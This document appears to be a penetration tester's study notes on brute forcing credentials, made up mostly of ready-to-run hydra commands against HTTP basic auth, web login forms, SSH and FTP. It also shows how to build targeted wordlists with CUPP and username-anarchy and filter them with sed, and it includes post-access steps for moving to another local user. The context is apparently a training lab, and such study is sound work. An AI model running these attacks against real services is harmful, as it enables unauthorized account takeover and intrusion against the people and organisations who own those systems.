# Basic HTTP Auth Brute Forcing
## Username/Password Attack
```
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f <IP> -s <p> http-get /
```
-u flag tries all users on each password
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 94.237.58.173 -s 44825 http-get /
```
## Username Brute Force
```
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
```
# Web Forms Brute Forcing
## Hydra Modules
### Admin Panel
- Default Credentials
- Password Spraying: reusing already found, guessed, or decrypted passwords across multiple accounts. Since we have been redirected to this admin panel, the same user may have access here.
### Brute Forcing Forms
```
http[s]-{head|get|post}
```
basic HTTP authentication
```
http[s]-post-form
```
used for login forms, like .php or .aspx and others.
we have to determine whether the web application uses GET or a POST form. We can test it by trying to log in and pay attention to the URL. If we recognize that any of our input was pasted into the URL, the web application uses a GET form. Otherwise, it uses a POST form
#### we need to provide three parameters
1- URL Path
2- POST Parameters
3- A failed/success login string
we have to specify a unique string from the source code of the page we're using to log in. Hydra will examine the HTML code of the response page it gets after each attempt, looking for the string we provided.
```
Fail: F=html_content
```
pick something from the HTML source of the login page. We can click [Ctrl + U] in Firefox to show the HTML page source, and search for login
```
Success: S=html_content
```
```
"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'”
```
## Determine Login Parameters
### Using Browser
Once we have the request, we can simply right-click on one of them, and select Copy > Copy POST data
```
username=test&password=test
```
```
Copy > Copy as cURL
```
```
curl 'http://178.128.40.63:31554/login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.40.63:31554' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://178.128.40.63:31554/login.php' -H 'Cookie: PHPSESSID=8iafr4t6c3s2nhkaj63df43v05' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=test&password=test'
```
### Using Burp Suite
## Login Form Attacks
### Default Credentials
```
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'”
```
### Password Wordlist
Often usernames such as admin, administrator, wpadmin, root, adm, and similar are used in administration panels and are rarely changed
```
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'”
```
# Service Authentication Attacks
## Personalized Wordlists
### CUPP
```
sudo apt install cupp
```
```
cupp -i
```
### Password Policy
- 8 characters or longer
- contains special characters
- contains numbers
- we can remove any passwords that do not meet these conditions from our wordlist
```
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
```
```
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
```
```
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
```
### Mangling
```
https://github.com/digininja/RSMangler
```
### Custom Username Wordlist
#### Username Anarchy
```
https://github.com/urbanadventurer/username-anarchy
```
```
./username-anarchy Bill Gates > bill.txt
```
## Service Authentication Brute Forcing
### SSH Attack
```
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
```
### FTP Brute Forcing
Once we are in, we can check out what other users are on the system:
```
ls /home
```
We notice another user, m.gates. We also notice in our local recon that port 21 is open locally, indicating that an FTP must be available:
```
netstat -antp | grep -i list
```
we can try brute forcing the FTP login for the m.gates user
```
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
```
We can now attempt to FTP as that user, or even switch to that user
```
ftp 127.0.0.1
```
input username m.gates and password discovered previously
# medusa
